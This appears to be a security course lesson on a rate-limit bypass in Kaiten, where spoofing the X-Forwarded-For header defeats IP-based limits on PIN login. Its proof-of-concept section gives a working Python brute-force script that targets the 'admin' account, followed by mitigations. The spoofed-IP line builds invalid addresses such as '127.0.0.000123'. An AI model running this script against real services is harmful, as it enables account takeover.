---
title: Real Example 1
---

## Kaiten

API authentication is a process that checks whether users are allowed to access data or features of an application. It helps protect sensitive information and functions by making sure only authorized users can use the API. If the authentication process is weak or done improperly, malicious users can exploit this vulnerability to gain unauthorized access.

To fully understand the result of weak or improper authentication, we will cover a real example found in Kaiten. This is a project management tool designed to streamline workflows and improve team collaboration. In this real example, we will cover a rate limit bypass to learn how weak security mechanisms can create opportunities for attackers to exploit.

## Rate Limiting

Rate limiting is a security measure designed to control the number of requests a client can make within a specific time frame. This mechanism helps prevent abuse, like brute force attacks, by limiting client requests.

In Kaiten, their rate limiter identified and tracked client requests using their IP address. This mechanism is applied across Kaiten's API to protect various endpoints. By monitoring the number requests originating from a specific IP address, the rate limiter ensures that clients cannot send excess requests.

## Rate Limit Bypass

In this real example, Kaiten tried to secure their PIN code authentication mechanism with rate limiting. They understood that by limiting the number of attempts, they can prevent attackers from guessing the correct PIN code.

Their rate limiter restricted the number of attempts from a single client by using their IP address to identify and track requests. However, they failed to account for the `X-Forwarded-For` header, which is commonly used by proxies to specify the original IP address of the client making the request.

This oversight meant that attacks could manipulate the header to spoof different IP addresses, effectively bypassing the rate limiter. By automating this process with a script, attackers could try all possible combinations of the 6-digit PIN to increase their chance of gaining unauthorized access.

## Proof of Concept

To bypass the rate limiter, we need to identify the endpoints where PIN and login requests are processed. In this case it is the `/pin` and `/login?redirectPath=%2F` endpoints. We also need to prepare all PIN codes.

```python
pin_url = "https://kaiten.example.com/pin"
login_url = "https://kaiten.example.com/login?redirectPath=%2F"

pin_list = [f"{i:06}" for i in range(1000000)]  # Generates all 6-digit PINs
```

After we have identified the endpoints and created a list of PIN codes, the next step is to request a PIN code so we perform a brute force attack. This will be a POST request to the login endpoint with the target username.

```python
def request_pin():
    data = {"username": "admin"}
    response = requests.post(login_url, json=data)
    
    if "not found" in response.text:
        print("User does not exist.")
        sys.exit(1)
```

The last step is to write the main logic to perform a brute force attack. We will use a `for` loop to go over each PIN code, sending each attempt to the pin endpoint. We spoof our IP address using the current PIN code.

```python
def brute_force_pin():
    for pin in pin_list:
        # 1. Spoof the IP address using the current PIN
        headers = {
            "X-Forwarded-For": f"127.0.0.{pin}"
        }

        data = {
            "username": "admin",
            "pin": pin
        }

        # 2. Send the POST request
        response = requests.post(pin_url, headers=headers, json=data)

        # 3. Check the response
        if response.status_code in range(200, 300):
            print(f"Valid PIN found: {pin}")
            print(response.json())
            sys.exit(0)
```

This loop automates the brute force attack by cycling through the PIN code list, sending each attempt to the pin endpoint. At the end, we include a delay before we can request a new PIN if our brute force attack failed.

```python
while True:
    request_pin()
    brute_force_pin()
    print("No valid PIN found, restarting the process...")
    time.sleep(300)  # Pause for 5 minutes before retrying
```

In total, we can try about 150 requests per second. Kaiten keeps a PIN code valid for only 5 minutes, but before the PIN expires we can try 45,000 times to guess the PIN code. Within 4 hours we will likely guess the correct PIN code. From this, we can learn that rate limiting should not only restrict based on the IP address but also consider other factors to make it effective.

## Mitigations

To prevent attacks that exploit rate limiting flaws, we should implement additional security measures that address different brute force strategies.

**Account Lockouts:** Introduce temporary account lockouts after a number of failed login attempts. For example, locking an account for 15 minutes after 5 failures can discourage brute force attacks and limit automated scripts.

**CAPTCHA Challenges:** Use CAPTCHA challenges on login pages, especially after repeated failed attempts. This introduces a manual step that disrupts automated attacks while allowing users to continue accessing their accounts.

The real example found in Kaiten demonstrates how rate limiting, while useful, must be implemented as part of a larger security framework to effectively prevent attacks. Rate limiting alone remains vulnerable to exploits by persistent and well-prepared attackers.

By including other security measures, we can design a strong and secure authentication process to protect the information and functions of our API.
